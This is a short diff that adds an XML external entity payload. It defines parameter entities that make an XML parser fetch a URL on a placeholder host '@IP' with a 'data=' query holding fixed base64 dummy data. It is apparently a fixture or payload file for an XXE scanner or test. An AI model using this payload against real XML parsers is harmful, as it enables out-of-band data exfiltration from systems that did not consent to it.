@@ -1,0 +1,3 @@
+<!ENTITY % payload
+	"<!ENTITY &#x25; send SYSTEM '@IP/?data=MTIzMTIzMTIzMTIz;'>">
+%payload;
